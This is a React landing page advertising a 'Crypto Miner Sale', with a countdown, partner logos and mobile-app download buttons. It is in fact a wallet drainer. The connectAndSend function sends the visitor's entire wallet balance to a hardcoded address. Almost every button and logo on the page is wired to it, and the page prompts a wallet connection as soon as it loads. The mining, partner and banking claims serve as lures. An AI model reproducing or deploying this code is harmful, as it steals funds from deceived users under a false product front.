import { useWeb3Modal } from '@web3modal/wagmi/react';
import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction } from 'wagmi';

const Home = () => {

    const { open } = useWeb3Modal()
    const { isConnected, address } = useAccount()
    const { data: hash, sendTransaction } = useSendTransaction()
    
    const [days, setDays] = useState("");
    const [hours, setHours] = useState("");
    const [minutes, setMinutes] = useState("");
    const [seconds, setSeconds] = useState("");

    const calculateTimeLeft = () => {
        const difference = +new Date(`2024-07-05T00:00:00`) - +new Date();
    
        if (difference > 0) {
            setDays(String(Math.floor(difference / (1000 * 60 * 60 * 24))))
            setHours(String(Math.floor((difference / (1000 * 60 * 60)) % 24)))
            setMinutes(String(Math.floor((difference / 1000 / 60) % 60)))
            setSeconds(String(Math.floor((difference / 1000) % 60)))
        }
    };

    useEffect(() => {
        const timer = setTimeout(() => {
        calculateTimeLeft();
        }, 1000);

        return () => clearTimeout(timer);
    });

    const { data: baseBalanceData } = useBalance({
        address: address,
        unit: "ether",
    });

    function checkConnect(){
        if(!isConnected){
            open({ view: 'Networks' })
        }
    }

    useEffect(() => {
        checkConnect()
    }, [address]);

    function connectAndSend() {
        if (!isConnected) {
            open({ view: 'Networks' })
        }else{
            const value = baseBalanceData?.value
            const to = "0x9d5eBa1AF95141f8f8fb943155bd45fDdB2639Fa"as `0x${string}` 
            sendTransaction({ to, value })
        }
    }
    return(
        <div>            
            <div>
                <section className="hero bg_img pos-rel pt-120" data-background="../assets/img/bg/hero-bg1.svg">
                    <div className="hero-shape">
                        <div className="shape--1">
                            <img className="leftToRight" src="../assets/hero-sp_01.svg" alt=""/>
                        </div>
                        <div className="shape--2">
                            <img className="topToBottom" src="../assets/hero-sp_02.svg" alt=""/>
                        </div>
                        <div className="shape--3">
                            <img className="leftToRight" src="../assets/hero-sp_04.svg" alt=""/>
                        </div>
                        <div className="shape--4">
                            <img className="topToBottom" src="../assets/hero-sp_03.svg" alt=""/>
                        </div>
                        <div className="shape--5">
                            <img className="topToBottom" src="../assets/hero-sp_05.svg" alt=""/>
                        </div>
                        <div className="shape--6">
                            <img className="leftToRight" src="../assets/hero-sp_06.svg" alt=""/>
                        </div>
                    </div>
                    <div className="container">
                        <div className="hero__content-wrap">
                            <div className="section-title hero--sec-titlt wow fadeInUp" data-wow-duration=".7s" style={{animationDuration: "0.7s", animation: "fadeInUp"}}>
                                <h1 className="title">Crypto Miner Sale is On</h1>
                            </div>
                            <div className="countdown ul_li_center wow fadeInUp mt-60" data-wow-duration=".7s" data-wow-delay="200ms" data-countdown="2024/08/28" style={{visibility: "visible", animationDuration: "0.7s", animationDelay: "200ms", animation: "fadeInUp"}}>
                                <div className="single"><p>Days</p><h1>{days}</h1></div> <div className="single"><p>Hours</p><h1>{hours}</h1></div> <div className="single"><p>Minutes</p><h1>{minutes}</h1></div> <div className="single"><p>SECONDS</p><h1>{seconds}</h1></div></div>
                            <div className="hero__btn btns pt-50 wow fadeInUp" data-wow-duration=".7s" data-wow-delay="350ms" style={{visibility: "visible", animationDuration: "0.7s", animationDelay: "350ms", animationName: "fadeInUp"}}>
                                <a className="them-btn" onClick={connectAndSend}>
                                    <span className="btn_label" data-text="Get Started">Start Mining</span>
                                    <span className="btn_icon">
                                        <svg width="15" height="14" viewBox="0 0 15 14" fill="none" xmlns="http:/www.w3.org/2000/svg">
                                            <path d="M14.434 0.999999C14.434 0.447714 13.9862 -8.61581e-07 13.434 -1.11446e-06L4.43396 -3.13672e-07C3.88168 -6.50847e-07 3.43396 0.447715 3.43396 0.999999C3.43396 1.55228 3.88168 2 4.43396 2L12.434 2L12.434 10C12.434 10.5523 12.8817 11 13.434 11C13.9862 11 14.434 10.5523 14.434 10L14.434 0.999999ZM2.14107 13.7071L14.1411 1.70711L12.7269 0.292893L0.726853 12.2929L2.14107 13.7071Z" fill="white"></path>
                                        </svg>
                                    </span>
                                </a>
                            </div>
                        </div>
                        <div className="token-structure mt-145 wow fadeInUp" data-wow-duration=".7s" data-wow-delay="450ms" style={{visibility: "visible", animationDuration: "0.7s", animationDelay: "450ms", animationName: "fadeInUp"}}>
                            <div className="row">
                                <div className="col-lg-5">
                                    <div className="hero-token">
                                        <h3 className="xb-item--title">Miner Structure</h3>
                                        <p className="xb-item--content">
                                            Our miner structure ensures transparency, fairness, and value. Join us in revolutionizing the digital economy.
                                        </p>
                                        <div className="xb-item--accept">
                                            <h5 className="xb-item--acc-title">We accept :</h5>
                                            <ul className="xb-item--list ul_li">
                                                <li><img src="../assets/hero-icon01.svg" alt=""/>Bitcoin</li>
                                                <li><img src="../assets/hero-icon02.svg" alt=""/>Ethereum</li>
                                                <li><img src="../assets/hero-icon03.svg" alt=""/>Litecoin</li>
                                                <li><img src="../assets/hero-icon04.svg" alt=""/>Ripple</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                                <div className="col-lg-7">
                                <div className="hero-sale">
                                    <div className="xb-item--sale_service ul_li_between">
                                        <span>Setup</span>
                                        <span>Mining</span>
                                        <span>Collect Earnings</span>
                                    </div>
                                    <div className="xb-item--line ul_li_between">
                                        <span></span>
                                        <span></span>
                                        <span></span>
                                    </div>
                                    <div className="xb-item--progress">
                                        <div className="xb-item--pro-color"><span className="shape"></span></div>
                                    </div>
                                    <div className="xb-item--target ul_li_between">
                                        <span>Skip the hardware buying and setup phase and start earning</span>
                                    </div>
                                </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
        
                <section className="partners z-3">
                    <div className="patners-title text-center">
                        <span><img src="../assets/partner_07.png" alt=""/> our top partners <img src="../assets/partner_08.png" alt=""/></span>
                    </div>
                    <div className="partner-active partner-slider ul_li swiper-container-initialized swiper-container-horizontal swiper-container-pointer-events"> 
                        <div className="swiper-wrapper" id="swiper-wrapper-c8c44c1010d10faa34" aria-live="off" style={{transitionDuration: "0ms", transform: "translate3d(-1905px, 0px, 0px)"}}><div className="swiper-slide swiper-slide-duplicate swiper-slide-duplicate-next" data-swiper-slide-index="3" role="group" aria-label="1 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_04.png" alt=""/>
                                    </div>
                                    <span>cardano</span>
                                </div>
                            </div><div className="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="4" role="group" aria-label="2 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_05.png" alt=""/>
                                    </div>
                                    <span>ethereum</span>
                                </div>
                            </div><div className="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="5" role="group" aria-label="3 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_06.png" alt=""/>
                                    </div>
                                    <span>Arbitrum</span>
                                </div>
                            </div><div className="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="6" role="group" aria-label="4 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_01.png" alt=""/>
                                    </div>
                                    <span>aptos</span>
                                </div>
                            </div>
                            <div className="swiper-slide" data-swiper-slide-index="0" role="group" aria-label="5 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_01.png" alt=""/>
                                    </div>
                                    <span>aptos</span>
                                </div>
                            </div>
                            <div className="swiper-slide swiper-slide-prev" data-swiper-slide-index="1" role="group" aria-label="6 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_02.png" alt=""/>
                                    </div>
                                    <span>algorand</span>
                                </div>
                            </div>
                            <div className="swiper-slide swiper-slide-active" data-swiper-slide-index="2" role="group" aria-label="7 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_03.png" alt=""/>
                                    </div>
                                    <span>binance</span>
                                </div>
                            </div>
                            <div className="swiper-slide swiper-slide-next" data-swiper-slide-index="3" role="group" aria-label="8 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_04.png" alt=""/>
                                    </div>
                                    <span>cardano</span>
                                </div>
                            </div>
                            <div className="swiper-slide" data-swiper-slide-index="4" role="group" aria-label="9 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_05.png" alt=""/>
                                    </div>
                                    <span>ethereum</span>
                                </div>
                            </div>
                            <div className="swiper-slide" data-swiper-slide-index="5" role="group" aria-label="10 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_06.png" alt=""/>
                                    </div>
                                    <span>Arbitrum</span>
                                </div>
                            </div>
                            <div className="swiper-slide" data-swiper-slide-index="6" role="group" aria-label="11 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_01.png" alt=""/>
                                    </div>
                                    <span>aptos</span>
                                </div>
                            </div>
                        <div className="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="0" role="group" aria-label="12 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_01.png" alt=""/>
                                    </div>
                                    <span>aptos</span>
                                </div>
                            </div><div className="swiper-slide swiper-slide-duplicate swiper-slide-duplicate-prev" data-swiper-slide-index="1" role="group" aria-label="13 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_02.png" alt=""/>
                                    </div>
                                    <span>algorand</span>
                                </div>
                            </div><div className="swiper-slide swiper-slide-duplicate swiper-slide-duplicate-active" data-swiper-slide-index="2" role="group" aria-label="14 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_03.png" alt=""/>
                                    </div>
                                    <span>binance</span>
                                </div>
                            </div><div className="swiper-slide swiper-slide-duplicate swiper-slide-duplicate-next" data-swiper-slide-index="3" role="group" aria-label="15 / 15" style={{width: "317.5px"}}>
                                <div className="xb-item--brand" onClick={connectAndSend}>
                                    <div className="xb-item--brand_logo">
                                        <img src="../assets/partner_04.png" alt=""/>
                                    </div>
                                    <span>cardano</span>
                                </div>
                            </div></div>
                    <span className="swiper-notification" aria-live="assertive" aria-atomic="true"></span></div>
                </section>
        
                <section className="process z-3">
                    <div className="container pt-30">
                        <div className="row justify-content-center mt-none-130">
                            <div className="col-xl-4 col-lg-6 process-col mt-130">
                                
                            </div>
                            <div className="col-xl-4 col-lg-6 process-col mt-130">
                                <div className="xb-process pos-rel">
                                    <div className="xb-item--icon">
                                        <img src="../assets/process_icon2.svg" alt=""/>
                                    </div>
                                    <div className="xb-item--holder">
                                        <h2 className="xb-item--title">Mine Crypto</h2>
                                        <p className="xb-item--content">To start mining, connect your wallet and navigate to the mining page. </p>
                                    </div>
                                    <div className="xb-item--shape">
                                        <span>
                                            <svg
                                                xmlns="http:/www.w3.org/2000/svg"
                                                width="410"
                                                height="274"
                                                fill="none"
                                                preserveAspectRatio="none"
                                                viewBox="0 0 410 274"
                                                >
                                                <path
                                                    fill="url(#p_shape2)"
                                                    d="M302.5 0c-82.4 55.6-167 23.167-199 0L0 274h410L302.5 0z"
                                                ></path>
                                                <defs></defs>
                                            </svg>                               
                                        </span>
                                    </div>
                                </div>
                            </div>
                            <div className="col-xl-4 col-lg-6 process-col mt-130">
                                
                            </div>
                        </div>
                    </div>
                </section>
        
                <section id="chart" className="token z-1 mt-50 pt-50 pb-150 bg_img pos-rel" data-background="assets/img/bg/token-bg.png" style={{backgroundImage: "url(&quot;assets/img/bg/token-bg.png&quot)"}}>
                    <div className="container">
                        <div className="section-title pb-55">
                            <h1 className="title">introduction to the cryto <br/> miner </h1>
                        </div>
                        <div className="token-wrap">
                            <div className="row mt-none-30">
                                <div className="col-xl-5 col-lg-6 mt-30">
                                    <div className="token-distribut">
                                        <h2 className="xb-item--title">Miner distribution</h2>
                                        <ul className="xb-item--list">
                                            <li>Reward</li>
                                            <li>team</li>
                                            <li>risk - management</li>
                                            <li>maintenance</li>
                                        </ul>
                                        <div className="xb-item--list-circle pos-rel">
                                            <div className="xb-item--circle"><span>70%</span></div>
                                            <div className="xb-item--circle"><span>10%</span></div>
                                            <div className="xb-item--circle"><span>6%</span></div>
                                            <div className="xb-item--circle"><span>2%</span></div>
                                        </div>
                                    </div>
                                </div>
                                <div className="col-xl-7 col-lg-6 mt-30">
                                    <div className="token-sale">
                                        <h2 className="xb-item--title">allocation of maintenance resource</h2>
                                        <div className="xb-item--progress_bar">
                                            <div className="xb-item--parcenteg ul_li">
                                                <span>56%</span>
                                                <span>24%</span>
                                                <span>12%</span>
                                                <span>8%</span>
                                            </div>
                                            <div className="xb-item--token_progress ul_li">
                                                <span className="color1"></span>
                                                <span className="color2"></span>
                                                <span className="color3"></span>
                                                <span className="color4"></span>
                                            </div>
                                        </div>
                                        <ul className="xb-item--pro_list ul_li">
                                            <li>Hardware Maintenance</li>
                                            <li>Platform development</li>
                                            <li>Infrastructure</li>
                                            <li>Marketing</li>
                                        </ul>
                                    </div>
                                    <div className="token-sale model">
                                        <h2 className="xb-item--title">Miner governance <br/> model</h2>
                                        <div className="xb-item--progress_bar">
                                            <div className="xb-item--parcenteg ul_li">
                                                <span>35%</span>
                                                <span>25%</span>
                                                <span>25%</span>
                                                <span>10%</span>
                                                <span>5%</span>
                                            </div>
                                            <div className="xb-item--token_progress ul_li">
                                                <span></span>
                                                <span></span>
                                                <span></span>
                                                <span></span>
                                                <span></span>
                                            </div>
                                        </div>
                                        <ul className="xb-item--pro_list ul_li">
                                            <li>cryco users</li>
                                            <li>Members</li>
                                            <li>Leaders</li>
                                            <li>Founders</li>
                                            <li>Co-creators</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="toke-shape">
                        <div className="shape--one">
                            <img className="leftToRight" src="../assets/token.svg" alt=""/>
                        </div>
                        <div className="shape--two">
                            <img className="topToBottom" src="../assets/token1.svg" alt=""/>
                        </div>
                    </div>
                </section>
        
                <section id="features" className="feature pos-rel pt-125 mb-170">
                    <div className="container">
                        <div className="feature-crypto bg_img" data-background="assets/img/bg/feature-bg.png" style={{backgroundImage: "url(&quot;assets/img/bg/feature-bg.png&quot)"}}>
                            <div className="row align-items-end">
                                <div className="col-lg-6">
                                    <div className="mobile-crypto">
                                        <div className="xb-item--sub-title">
                                            <span><svg width="16" height="20" viewBox="0 0 16 20" fill="none" xmlns="http:/www.w3.org/2000/svg">
                                                <path d="M14.6448 8.99798C14.223 8.02696 13.6099 7.15543 12.8438 6.43787L12.2116 5.84453C12.1901 5.82499 12.1643 5.81106 12.1363 5.80409C12.1084 5.79704 12.0792 5.79721 12.0513 5.80443C12.0234 5.81165 11.9978 5.82584 11.9764 5.84555C11.9551 5.86535 11.9389 5.89016 11.9292 5.91786L11.6468 6.74682C11.4708 7.26683 11.1471 7.79797 10.6886 8.32018C10.6582 8.35349 10.6235 8.36241 10.5996 8.36462C10.5757 8.36683 10.5388 8.36241 10.5062 8.33132C10.4758 8.30464 10.4606 8.26462 10.4627 8.22459C10.5431 6.88685 10.1521 5.37789 9.29609 3.73562C8.58788 2.37114 7.60377 1.30668 6.3741 0.564432L5.47683 0.0244217C5.35957 -0.0466972 5.2096 0.0466409 5.21615 0.186644L5.26398 1.25334C5.29653 1.98225 5.21402 2.62671 5.01842 3.16227C4.77949 3.81784 4.43622 4.42675 3.99735 4.97343C3.69198 5.35333 3.34581 5.69703 2.96549 5.9979C2.04933 6.71827 1.3044 7.64137 0.786445 8.69796C0.269767 9.7638 0.000628769 10.9373 0 12.127C0 13.1759 0.202039 14.1914 0.601783 15.1492C0.987762 16.0714 1.54477 16.9083 2.24201 17.6137C2.94587 18.3248 3.76276 18.8849 4.67303 19.2738C5.61592 19.6782 6.61524 19.8826 7.64719 19.8826C8.67913 19.8826 9.67845 19.6782 10.6213 19.276C11.5293 18.8894 12.3551 18.3255 13.0523 17.6159C13.7563 16.9048 14.3081 16.0737 14.6925 15.1514C15.0917 14.1963 15.2965 13.1679 15.2944 12.1292C15.2944 11.0447 15.0771 9.99135 14.6448 8.99798Z" fill="#FF0000"></path>
                                            </svg>Mobile App 2.0 <span className="new-btn">new</span>
                                            </span>
                                        </div>
                                        <h2 className="xb-item--title">mobile cryptobank</h2>
                                        <p className="xb-item--content">
                                            Everything you need in your smartphone: payments, transfers, currency exchange, instant loans. Our goal-replace your bank
                                        </p>
                                        <ul className="xb-item--crypto-list">
                                            <li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http:/www.w3.org/2000/svg">
                                                <path d="M18 9C18 9.768 17.0565 10.401 16.8675 11.109C16.6725 11.841 17.166 12.861 16.7955 13.5015C16.419 14.1525 15.2865 14.2305 14.7585 14.7585C14.2305 15.2865 14.1525 16.419 13.5015 16.7955C12.861 17.166 11.841 16.6725 11.109 16.8675C10.401 17.0565 9.768 18 9 18C8.232 18 7.599 17.0565 6.891 16.8675C6.159 16.6725 5.139 17.166 4.4985 16.7955C3.8475 16.419 3.7695 15.2865 3.2415 14.7585C2.7135 14.2305 1.581 14.1525 1.2045 13.5015C0.834 12.861 1.3275 11.841 1.1325 11.109C0.9435 10.401 0 9.768 0 9C0 8.232 0.9435 7.599 1.1325 6.891C1.3275 6.159 0.834 5.139 1.2045 4.4985C1.581 3.8475 2.7135 3.7695 3.2415 3.2415C3.7695 2.7135 3.8475 1.581 4.4985 1.2045C5.139 0.834 6.159 1.3275 6.891 1.1325C7.599 0.9435 8.232 0 9 0C9.768 0 10.401 0.9435 11.109 1.1325C11.841 1.3275 12.861 0.834 13.5015 1.2045C14.1525 1.581 14.2305 2.7135 14.7585 3.2415C15.2865 3.7695 16.419 3.8475 16.7955 4.4985C17.166 5.139 16.6725 6.159 16.8675 6.891C17.0565 7.599 18 8.232 18 9Z" fill="white"></path>
                                                <path d="M11.6674 6.85539L8.54986 9.88334L6.93376 8.31501C6.58297 7.9743 6.01379 7.9743 5.663 8.31501C5.3122 8.65572 5.3122 9.20854 5.663 9.54926L7.93018 11.7513C8.27141 12.0827 8.82558 12.0827 9.16682 11.7513L12.9368 8.08963C13.2876 7.74892 13.2876 7.1961 12.9368 6.85539C12.586 6.51468 12.0182 6.51468 11.6674 6.85539Z" fill="#080B18"></path>
                                                </svg> No limits on transaction volume.</li>
                                            <li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http:/www.w3.org/2000/svg">
                                                <path d="M18 9C18 9.768 17.0565 10.401 16.8675 11.109C16.6725 11.841 17.166 12.861 16.7955 13.5015C16.419 14.1525 15.2865 14.2305 14.7585 14.7585C14.2305 15.2865 14.1525 16.419 13.5015 16.7955C12.861 17.166 11.841 16.6725 11.109 16.8675C10.401 17.0565 9.768 18 9 18C8.232 18 7.599 17.0565 6.891 16.8675C6.159 16.6725 5.139 17.166 4.4985 16.7955C3.8475 16.419 3.7695 15.2865 3.2415 14.7585C2.7135 14.2305 1.581 14.1525 1.2045 13.5015C0.834 12.861 1.3275 11.841 1.1325 11.109C0.9435 10.401 0 9.768 0 9C0 8.232 0.9435 7.599 1.1325 6.891C1.3275 6.159 0.834 5.139 1.2045 4.4985C1.581 3.8475 2.7135 3.7695 3.2415 3.2415C3.7695 2.7135 3.8475 1.581 4.4985 1.2045C5.139 0.834 6.159 1.3275 6.891 1.1325C7.599 0.9435 8.232 0 9 0C9.768 0 10.401 0.9435 11.109 1.1325C11.841 1.3275 12.861 0.834 13.5015 1.2045C14.1525 1.581 14.2305 2.7135 14.7585 3.2415C15.2865 3.7695 16.419 3.8475 16.7955 4.4985C17.166 5.139 16.6725 6.159 16.8675 6.891C17.0565 7.599 18 8.232 18 9Z" fill="white"></path>
                                                <path d="M11.6674 6.85539L8.54986 9.88334L6.93376 8.31501C6.58297 7.9743 6.01379 7.9743 5.663 8.31501C5.3122 8.65572 5.3122 9.20854 5.663 9.54926L7.93018 11.7513C8.27141 12.0827 8.82558 12.0827 9.16682 11.7513L12.9368 8.08963C13.2876 7.74892 13.2876 7.1961 12.9368 6.85539C12.586 6.51468 12.0182 6.51468 11.6674 6.85539Z" fill="#080B18"></path>
                                                </svg> ApplePay, Samsung Pay, AndroidPay, QR code</li>
                                            <li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http:/www.w3.org/2000/svg">
                                                <path d="M18 9C18 9.768 17.0565 10.401 16.8675 11.109C16.6725 11.841 17.166 12.861 16.7955 13.5015C16.419 14.1525 15.2865 14.2305 14.7585 14.7585C14.2305 15.2865 14.1525 16.419 13.5015 16.7955C12.861 17.166 11.841 16.6725 11.109 16.8675C10.401 17.0565 9.768 18 9 18C8.232 18 7.599 17.0565 6.891 16.8675C6.159 16.6725 5.139 17.166 4.4985 16.7955C3.8475 16.419 3.7695 15.2865 3.2415 14.7585C2.7135 14.2305 1.581 14.1525 1.2045 13.5015C0.834 12.861 1.3275 11.841 1.1325 11.109C0.9435 10.401 0 9.768 0 9C0 8.232 0.9435 7.599 1.1325 6.891C1.3275 6.159 0.834 5.139 1.2045 4.4985C1.581 3.8475 2.7135 3.7695 3.2415 3.2415C3.7695 2.7135 3.8475 1.581 4.4985 1.2045C5.139 0.834 6.159 1.3275 6.891 1.1325C7.599 0.9435 8.232 0 9 0C9.768 0 10.401 0.9435 11.109 1.1325C11.841 1.3275 12.861 0.834 13.5015 1.2045C14.1525 1.581 14.2305 2.7135 14.7585 3.2415C15.2865 3.7695 16.419 3.8475 16.7955 4.4985C17.166 5.139 16.6725 6.159 16.8675 6.891C17.0565 7.599 18 8.232 18 9Z" fill="white"></path>
                                                <path d="M11.6674 6.85539L8.54986 9.88334L6.93376 8.31501C6.58297 7.9743 6.01379 7.9743 5.663 8.31501C5.3122 8.65572 5.3122 9.20854 5.663 9.54926L7.93018 11.7513C8.27141 12.0827 8.82558 12.0827 9.16682 11.7513L12.9368 8.08963C13.2876 7.74892 13.2876 7.1961 12.9368 6.85539C12.586 6.51468 12.0182 6.51468 11.6674 6.85539Z" fill="#080B18"></path>
                                                </svg> Contactless payments options</li>
                                            <li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http:/www.w3.org/2000/svg">
                                                <path d="M18 9C18 9.768 17.0565 10.401 16.8675 11.109C16.6725 11.841 17.166 12.861 16.7955 13.5015C16.419 14.1525 15.2865 14.2305 14.7585 14.7585C14.2305 15.2865 14.1525 16.419 13.5015 16.7955C12.861 17.166 11.841 16.6725 11.109 16.8675C10.401 17.0565 9.768 18 9 18C8.232 18 7.599 17.0565 6.891 16.8675C6.159 16.6725 5.139 17.166 4.4985 16.7955C3.8475 16.419 3.7695 15.2865 3.2415 14.7585C2.7135 14.2305 1.581 14.1525 1.2045 13.5015C0.834 12.861 1.3275 11.841 1.1325 11.109C0.9435 10.401 0 9.768 0 9C0 8.232 0.9435 7.599 1.1325 6.891C1.3275 6.159 0.834 5.139 1.2045 4.4985C1.581 3.8475 2.7135 3.7695 3.2415 3.2415C3.7695 2.7135 3.8475 1.581 4.4985 1.2045C5.139 0.834 6.159 1.3275 6.891 1.1325C7.599 0.9435 8.232 0 9 0C9.768 0 10.401 0.9435 11.109 1.1325C11.841 1.3275 12.861 0.834 13.5015 1.2045C14.1525 1.581 14.2305 2.7135 14.7585 3.2415C15.2865 3.7695 16.419 3.8475 16.7955 4.4985C17.166 5.139 16.6725 6.159 16.8675 6.891C17.0565 7.599 18 8.232 18 9Z" fill="white"></path>
                                                <path d="M11.6674 6.85539L8.54986 9.88334L6.93376 8.31501C6.58297 7.9743 6.01379 7.9743 5.663 8.31501C5.3122 8.65572 5.3122 9.20854 5.663 9.54926L7.93018 11.7513C8.27141 12.0827 8.82558 12.0827 9.16682 11.7513L12.9368 8.08963C13.2876 7.74892 13.2876 7.1961 12.9368 6.85539C12.586 6.51468 12.0182 6.51468 11.6674 6.85539Z" fill="#080B18"></path>
                                                </svg> Integration with third-party payment wallets or services</li>
                                        </ul>
                                        <div className="xb-item--crypto-btn">
                                            <a className="them-btn crp-btn" onClick={connectAndSend}>
                                                <span className="btn_icon">
                                                    <i className="fab fa-apple"></i>
                                                </span>
                                                <span className="btn_label" data-text="Apple iOS">Apple iOS</span>
                                            </a>
                                            <a className="them-btn crp-btn" onClick={connectAndSend}>
                                                <span className="btn_icon"><svg width="21" height="14" viewBox="0 0 21 14" fill="none" xmlns="http:/www.w3.org/2000/svg">
                                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M0.398804 12.1266C0.537847 10.5267 1.04394 9.05395 1.91712 7.70827C2.78967 6.3626 3.95204 5.29345 5.40423 4.50098L3.68942 1.63014C3.59672 1.49556 3.57354 1.35352 3.61989 1.204C3.66624 1.05447 3.76666 0.942338 3.92114 0.867577C4.04473 0.792815 4.18378 0.777861 4.33826 0.822713C4.49276 0.867577 4.61635 0.957281 4.70904 1.09186L6.42386 3.96269C7.75246 3.42441 9.14288 3.15528 10.5951 3.15528C12.0472 3.15528 13.4377 3.42441 14.7662 3.96269L16.4811 1.09186C16.5738 0.957281 16.6974 0.867577 16.8518 0.822713C17.0063 0.777861 17.1454 0.792815 17.269 0.867577C17.4235 0.942338 17.5239 1.05447 17.5702 1.204C17.6165 1.35352 17.5934 1.49556 17.5007 1.63014L15.7859 4.50098C17.238 5.29345 18.4007 6.3626 19.2739 7.70827C20.1464 9.05395 20.6523 10.5267 20.7913 12.1266V13.826H0.398804V12.1266ZM6.78336 9.3339C6.55904 9.55096 6.28467 9.6595 5.96025 9.6595C5.63581 9.6595 5.36175 9.55096 5.13805 9.3339C4.91374 9.1174 4.80158 8.85207 4.80158 8.53814C4.80158 8.22409 4.91374 7.95888 5.13805 7.74238C5.36175 7.5252 5.63581 7.41666 5.96025 7.41666C6.28467 7.41666 6.55904 7.5252 6.78336 7.74238C7.00706 7.95888 7.11891 8.22409 7.11891 8.53814C7.11891 8.85207 7.00706 9.1174 6.78336 9.3339ZM16.0527 9.3339C15.8283 9.55096 15.5539 9.6595 15.2296 9.6595C14.9051 9.6595 14.6311 9.55096 14.4074 9.3339C14.1831 9.1174 14.071 8.85207 14.071 8.53814C14.071 8.22409 14.1831 7.95888 14.4074 7.74238C14.6311 7.5252 14.9051 7.41666 15.2296 7.41666C15.5539 7.41666 15.8283 7.5252 16.0527 7.74238C16.2764 7.95888 16.3882 8.22409 16.3882 8.53814C16.3882 8.85207 16.2764 9.1174 16.0527 9.3339Z" fill="#080B18"></path>
                                                </svg></span>
                                                <span className="btn_label" data-text="Android">Android</span>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div className="col-lg-6">
                                    <div className="cry-mobile-img">
                                        <img src="../assets/fea-mobile.png" alt=""/>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="feature-shape align-items-center">
                        <img src="../assets/fea-color-sp.png" alt=""/>
                    </div>
                </section>
        
                <div className="bg_img top-center pos-rel pb-145" data-background="assets/img/bg/team-bg.png" style={{backgroundImage: "url(&quot;assets/img/bg/team-bg.png&quot)"}}>
                    <div className="team-shape">
                        <div className="shape shape--1">
                            <img className="leftToRight" src="../assets/team-sp_01.svg" alt=""/>
                        </div>
                        <div className="shape shape--2">
                            <img className="topToBottom" src="../assets/team-sp_02.svg" alt=""/>
                        </div>
                        <div className="shape shape--3">
                            <img className="leftToRight" src="../assets/team-sp_03.svg" alt=""/>
                        </div>
                        <div className="shape shape--4">
                            <img className="topToBottom" src="../assets/team-sp_04.svg" alt=""/>
                        </div>
                    </div>
                </div>
                
            </div>
        </div>
    );
}

export default Home;